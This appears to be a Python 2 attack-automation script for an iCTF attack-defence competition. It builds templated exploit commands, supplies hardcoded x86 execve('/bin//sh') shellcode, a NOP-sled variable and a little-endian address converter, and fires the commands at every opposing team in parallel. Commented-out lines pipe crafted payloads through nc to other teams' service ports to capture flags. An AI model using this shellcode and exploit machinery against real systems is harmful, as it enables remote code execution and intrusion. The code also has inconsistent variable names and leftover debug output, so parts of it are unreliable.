import sys
import threading
import os
import subprocess
import multiprocessing
from ictf import iCTF

attackCommand=""
serviceVarFound=0
nonserviceVarFound=0
ourTeamNum=1
teams = 3
tick=5
"""i = iCTF("http://52.34.158.221/")
t = i.login("team"+ourTeamNum+"@example.com","password")
serviceList=t.get_service_list()"""


varList=[]
varDict={'$NOP;':"\"\\x90\"",'$SHELLCODE;':"/bin//sh"}
varIndexDict={}
paramDict = {'-CLP_maxtry':10, '-CLP_addr_change':100}

def getInput(display_msg):
    # return input(display_msg)
    return raw_input(display_msg)


def getShellCode(my_command):
    #subprocess.Popen("gcc -m32 -z execstack prog_shell.c", shell=True, stdout=subprocess.PIPE).stdout.read()
    #return subprocess.Popen("./a.out " + my_command, shell=True, stdout=subprocess.PIPE).stdout.read()
    return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 


def getExploitString(shell_command):
    shellcode = getShellCode(shell_command)
    tmpShellCode = "\"" + str(shellcode[:len(shellcode) - 1]) + "\""
    return tmpShellCode


def getEndianAddress(address):
	newAddress = ""
	for i in range(0,len(address),2):
		newAddress = "\\x" + address[i] + address[i+1] + newAddress
	return "\""+newAddress+"\""


# variable define by user will start with $ and terminate with ; => $var;
def getCommand(string):
    global serviceVarFound,nonServiceVarFound
    if(string==""):
        string = getInput("Enter command: ")
    val = ""
    serviceVarFound=0
    nonServiceVarFound=0
    while(string.find('$') != -1 and not serviceVarFound):
        sindex = string.find('$')
        eindex = string.find(';')
        if eindex == -1:
            print("Incorrect variable declaration. Use ';' to terminate variable name.")
            exit(1)
        if(string[sindex+1]!='_'):
            var = string[sindex:eindex+1]
        
            print "******"

            print var

            print "*******"
            if varDict.__contains__(var):
                val = varDict[var]
            else:
                print "xxxxxxxx"
                val = getInput(var + " = ")
                print "xxxxxxxx"
            if var == "$shellcode;":
                val = getExploitString(val)
            if var == "$address;":
                val = getEndianAddress(val)
            string = string.replace(var,val)
            
        else:
            serviceVarFound=1

    return string


def replaceServiceVar(string,teamNum):
    global serviceList,nonServiceVarFound
    val = ""
    serviceVarFound=0
    nonServiceVarFound=0
    
    while(string.find('$') != -1 and nonServiceVarFound==0):
        sindex = string.find('$')
        eindex = string.find(';')
        if eindex == -1:
            print("Incorrect variable declaration. Use ';' to terminate variable name.")
            exit(1)
        if(string[sindex+1]=='_'):
            var = string[sindex:eindex+1]
        
            print "****Service**"

            print var,string[(sindex+2):eindex]

            print "***Service****"
            """if varDict.__contains__(var):
                val = varDict[var]
            else:"""
            
            print serviceList[teamNum][string[sindex+2:eindex]]
            val = str(serviceList[teamNum][string[sindex+2:eindex]])
            print "11111"
            string = string.replace(var,val)
            print "22222"
        else:
            nonServiceVarFound=1

    print "outside ",string 
    return string


# parameters defined as " -<param> value "
def getParameters(string):
    commandList = []
    commandList = string.split(" ")
    for param in paramDict:
        if commandList.__contains__(param):
            index = commandList.index(param)
            paramDict[param] = commandList[index+1]
            commandList.remove(commandList[index+1])
            commandList.remove(commandList[index])
    command = ""
#   command = "echo `python -c 'print "
    for cmd in commandList:
        command = command + cmd + " "
#    command = command + "'`"
    return command


def getFlags(command,teamNum):
    global serviceList,t
    flagList=[]
    result=[]
    
    """
    proc=subprocess.Popen("echo 'R' " + flagId + " '`python -c \"print " + shellcode + " \"`'" + " | xargs -n 1 | nc team"+teamNum + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)"""
        
           
    #proc=subprocess.Popen(command + " | nc " + str(serviceList[teamNum]['host']) + " " + str(serviceList[teamNum]['port']), shell=True, stdout=subprocess.PIPE,)
    
    print command
    
    proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,)
        
    
    output=proc.communicate()[0]
    print output

    
def attackTeams(command,teamNum):
    global serviceList,t,nonServiceVarFound,serviceVarFound
#    print "********* Attacking **********",teamNum,(varDict["$address"]),type(varDict["$address"])   
    
    #hex_int = int(hex_str, 16)
    
    finalCommandStr = command
    
    """if("$address" in varDict):
        for s in generateHexCombo(int(varDict["$address"], 16)):
                addr = '0x'+str(s)
                #print addr
                #addr='0x'+varDict["$address"]
                rearrangedAddr=""
                for i in range(len(addr)-1,1,-2):
                    rearrangedAddr+='\\x'+addr[i-1]+addr[i]
     
                varDict["$address"]=rearrangedAddr
                commandList[varIndexDict["$address"]]=rearrangedAddr
                """
    while(nonServiceVarFound or serviceVarFound):
        if(serviceVarFound):
            serviceVarFound=0
            command = replaceServiceVar(command,teamNum)
        if(nonServiceVarFound):
            nonServiceVarFound=0
            command = getCommand(command)
            
    print command
    #getFlags(command,teamNum)
    

def multiProcessAttacks(teamNum):
    global ourTeamNum
    if((teamNum)!=ourTeamNum):
        print(multiprocessing.current_process())
        print teamNum
        attackTeams(attackCommand,teamNum)

        
def getServiceList():
    global serviceList,t
    
    flagsList = []
    
    #serviceList=t.get_service_list()
    
    serviceList=[{u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in C.', u'service_name': u'sample_c', u'team_id': 0, u'state': u'enabled', u'upload_id': 1, u'authors': u'UCSB', u'service_id': 10001, u'port': 10001,u'host':'localhost'}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in Python.', u'service_name': u'sample_py', u'team_id': 0, u'state': u'enabled', u'upload_id': 2, u'authors': u'The iCTF team 2016', u'service_id': 10002, u'port': 10002,u'host':'localhost'}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service for the web.', u'service_name': u'sample_web', u'team_id': 0, u'state': u'enabled', u'upload_id': 3, u'authors': u'UCSB', u'service_id': 10003, u'port': 10003,u'host':'localhost'}]
    

if __name__ == "__main__":
    
    global serviceList,attackCommand
    print(paramDict)
    getServiceList()
    print serviceList
    attackCommand = getCommand("")
    attackCommand = getParameters(attackCommand)
    print(attackCommand)
    print(paramDict)
    
    p = multiprocessing.Pool(processes=3)
    p.map(multiProcessAttacks,range(teams))
    #attackTeams(attackCommand,1)
    

#    print(subprocess.Popen(attackCommand, shell=True, stdout=subprocess.PIPE).stdout.read())

